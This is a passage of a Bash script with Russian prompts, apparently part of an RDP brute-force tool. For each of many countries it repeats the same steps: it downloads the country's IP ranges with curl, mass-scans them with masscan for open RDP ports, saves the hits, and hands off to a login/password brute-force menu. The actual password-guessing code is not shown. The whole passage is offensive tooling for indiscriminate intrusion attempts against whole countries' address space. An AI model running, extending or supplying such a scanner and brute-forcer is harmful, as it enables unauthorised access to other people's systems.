echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "172" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SRI+LANKA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Sri Lanka://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "173" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SOUTH+SUDAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/South Sudan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "174" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SURINAME.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Suriname://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "175" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SWAZILAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Swaziland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "176" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SWEDEN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Sweden://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "177" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SWITZERLAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Switzerland://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "178" ]; then
curl http://services.ce3c.be/ciprg/?countrys=SYRIAN+ARAB+REPUBLIC |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Syrian Arab Republic://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "179" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TAIWAN%3B+REPUBLIC+OF+CHINA+%28ROC%29 |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Taiwan; Republic of China (ROC)://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "180" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TAJIKISTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Tajikistan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "181" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TANZANIA+UNITED+REPUBLIC+OF |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Tanzania United Republic of://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "182" ]; then
curl http://services.ce3c.be/ciprg/?countrys=THAILAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Thailand://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "183" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TOGO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Togo://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "184" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TONGA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Tonga://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "185" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TRINIDAD+AND+TOBAGO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Trinidad and Tobago://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "186" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TUNISIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Tunisia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "187" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TURKEY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Turkey://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "188" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TURKMENISTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Turkmenistan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "189" ]; then
curl http://services.ce3c.be/ciprg/?countrys=TUVALU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Tuvalu://g">list
